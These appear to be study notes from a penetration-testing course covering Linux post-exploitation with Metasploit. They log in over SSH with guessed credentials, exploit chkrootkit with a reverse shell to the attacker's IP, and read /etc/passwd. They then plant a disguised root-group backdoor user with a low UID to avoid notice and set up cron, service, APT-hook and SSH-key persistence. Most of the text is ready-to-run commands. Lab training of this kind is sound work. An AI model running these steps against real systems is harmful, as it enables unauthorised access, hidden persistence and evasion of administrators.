* PRACTICAL
* Repeat steps till db_nmap
* `use auxiliary/scanner/ssh/ssh_login`
* `set username [uname]`
* `set password [pword]`
* `run`
* **Exploiting the vulnerability in CHKROOTKIT**
  * `use exploit/unix/local/chkrootkit`
  * `set session [ID]`
  * `set chkrootkit /bin/chkrootkit`
  * `set payload cmd/unix/reverse`
  * `set lhost [attacker's IP]`
  * `run` --> Command shell
  * `sessions -u [ID]` -- > Meterpreter session
 
  * Inside Meterpreter
  * `shell`
  * `/bin/bash -i`
  * `cat /etc/passwd`
  * While creating a new user, create a username that would blend in and doesn/t raise suspicion.
  * `useradd -m [Legit name like ftp] -s /bin/bash`
  * `passwd [uname]`
  * Now we need to add this user to the Root group:
  * `usermod -aG root ftp`
  * Check it --> `groups [uname]`
 
  * Utilize this backdoor user to authenticate legitimately to the system as this user is par t of the root group and any user on a Linux system with root privileges can do:
    * Creating a persistent service
    * Creating a Cron job, OR
    * Adding a SSH key to the actual SSH directory within the user's home directory.
   
  * **To make a user ID look like it wasn't created recently**:
    * As the most recent ID's have higher chances of catching eyes, for eg if the last user was 1001, our new user will have ID 1002:
    * `usrermod -u 13 [uname]`
    * Check --> `cat /etc/passwd`
   
  * **Persistence module**
    * `use exploit/linux/local/apt_package_manager_persistence`
    * This module will run a payload when the package manager is used.
    * No handler is ran automatically so you must configure an appropriate exploit/multi/handler to connect.
    * This module creates a pre-invoke hook for APT in apt.conf.d. The hook name syntax is numeric followed by text.
    * We will not use this module as we don't want to rely on an instance . We need some exploit that is running continuously even after some interruption.
    * ***
    * `use exploit/linux/local/cron_persistence`
    * `set session [ID]`
    * `set lhost [IP]`
    * Windows has greater chance of running the Cron jobs successfully than a Linux system
    * This one can do the job but being a CRON job it can be easily spotted on the target.
    * ***
    * `use exploit/linux/local/service_persistence`
    * `set session [ID]`
    * `set payload cmd/unix/reverse_python`
    * `set lhost [IP]`
    * `set lport [port]`
    * `run`
    * This also might not work.
    * ***
    * `use post/linux/manage/sshkey_persistence`
    * This module will add an SSH key to a specified user (or all), to allow remote login via SSH at any time.
    * SSH public key added to a user's home directory is hardly noticed by the user, so hard to raise any  suspicions.
    * It will setup a private and public SSH key pair --> Provide the public key to get a private key from this module --> Which can be provided to authenticate.
    * `set createsshfolder true` -->If no .ssh folder is found, create it for a user
    * `set session [ID]`
    * `run`
    * `loot`
    * `cat [path to the private key]`
    * **Utilize the private key**
    * `exit -y`
    * `vim ssh_key`
    * Paste the private key
    * `chmod 0400 ssh_key` --> permission for a private key
    * `ssh -i ssh_key [username like root]@[Target IP]` -->This should log you in to the target
